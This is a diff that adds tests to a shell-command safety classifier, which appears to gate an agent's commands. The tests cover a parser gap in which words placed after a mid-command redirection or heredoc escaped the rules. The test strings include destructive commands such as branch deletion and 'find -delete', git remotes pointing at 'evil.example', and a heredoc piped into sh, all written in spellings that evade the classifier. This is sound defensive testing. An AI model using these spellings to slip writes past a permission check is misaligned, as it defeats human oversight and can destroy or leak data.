@@ -1116,3 +1116,84 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     });
   });
 });
+
+// A redirection takes one word as its target. tree-sitter attaches the words
+// after it to the redirection too, so they never reach the command's
+// arguments and no rule sees them (#16856).
+describe('words after a redirection in the middle of a command', () => {
+  it.each([
+    'git branch < /dev/null -D main',
+    'git branch </dev/null -D main',
+    'git < /dev/null push origin main',
+    'git remote < /dev/null add origin https://evil.example/x',
+    'git remote < /dev/null show https://evil.example/leak',
+    'find . < /dev/null -delete',
+    "sed < /dev/null -i 's/a/b/' f",
+    'git branch 2>&1 -D main',
+    'find . 2>&1 -delete',
+    'git branch <&0 -D main',
+    'git branch < a < b -D main',
+    'git branch < /dev/null -D main | cat',
+  ])('does not classify %j as read-only', async (command) => {
+    expect(await classifyShellCommandSafety(command)).toBe('unknown');
+    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
+  });
+
+  it.each([
+    'git status < /dev/null',
+    'git status 2>&1',
+    'git status 2>&1 | head',
+    'cat < a.txt < b.txt',
+    'cat < "my file.txt"',
+    'git log --oneline <&0',
+  ])('keeps %j read-only: one word per redirection', async (command) => {
+    expect(await classifyShellCommandSafety(command)).toBe('read-only');
+  });
+
+  it.each([
+    'git branch -D main < /dev/null',
+    'git branch > out.txt -D main',
+    'git branch 2>/dev/null -D main',
+    '< /dev/null git push origin main',
+  ])('keeps %j a write', async (command) => {
+    expect(await classifyShellCommandSafety(command)).toBe('write');
+  });
+
+  // The rest of a heredoc's first line is filed under the heredoc node: the
+  // words, the redirection, the pipeline or the next command of a list.
+  it.each([
+    'git branch <<EOF -D main\nx\nEOF',
+    'find . <<EOF -delete\nx\nEOF',
+    'cat <<EOF | sh\nrm x\nEOF',
+  ])('does not classify %j as read-only', async (command) => {
+    expect(await classifyShellCommandSafety(command)).toBe('unknown');
+  });
+
+  it.each([
+    'cat <<EOF > out.txt\nhi\nEOF',
+    'cat <<EOF >> out.txt\nhi\nEOF',
+    'cat <<EOF && rm x\nhi\nEOF',
+    'cat <<EOF | tee out.txt\nhi\nEOF',
+    'cat <<EOF | git push origin main\nhi\nEOF',
+  ])('classifies %j as a write', async (command) => {
+    expect(await classifyShellCommandSafety(command)).toBe('write');
+  });
+
+  it.each([
+    'cat <<EOF\nhi\nEOF',
+    "cat <<'EOF'\nhi\nEOF",
+    'cat <<EOF | grep hi\nhi\nEOF',
+    'cat <<EOF | grep hi | wc -l\nhi\nEOF',
+    'git status <<EOF 2>&1\nhi\nEOF',
+  ])('keeps %j read-only', async (command) => {
+    expect(await classifyShellCommandSafety(command)).toBe('read-only');
+  });
+
+  it('asks about a harmless command written this way too', async () => {
+    // `cat < a.txt b.txt` only prints b.txt. The extra word is still one no
+    // rule has read, so the spelling is not taken as read-only.
+    expect(await classifyShellCommandSafety('cat < a.txt b.txt')).toBe(
+      'unknown',
+    );
+  });
+});
